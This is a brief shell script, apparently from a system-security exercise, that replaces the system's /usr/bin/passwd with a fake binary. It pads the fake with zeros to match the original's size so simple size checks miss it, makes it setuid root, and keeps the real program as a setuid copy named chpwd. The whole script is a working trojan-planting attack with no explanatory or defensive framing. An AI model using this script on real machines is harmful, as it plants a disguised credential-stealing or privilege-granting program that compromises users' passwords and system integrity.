#!/usr/bin/sh

real_passwd="/usr/bin/passwd"
real_passwd_backup="/usr/bin/chpwd"
fake_passwd="/home/stocki/Schreibtisch/dev/syse/shell/passwd"

size_real=$(du -b $real_passwd | cut -f1)
size_fake=$(du -b $fake_passwd | cut -f1)

echo "size real =  $size_real"
echo "size fake =  $size_fake"

diff=$(expr $size_real - $size_fake)
echo "diff =  $diff"

dd if=/dev/zero count=$diff bs=1c >> $fake_passwd

size_orig=$(du -b $real_passwd | cut -f1)
size_fake=$(du -b $fake_passwd | cut -f1)

echo "size real =  $size_real"
echo "size fake =  $size_fake"

sudo chown root $fake_passwd
sudo chmod 4755 $fake_passwd
sudo cp $real_passwd $real_passwd_backup
sudo chown root $real_passwd_backup
sudo chmod 4755 $real_passwd_backup
sudo cp $fake_passwd $real_passwd
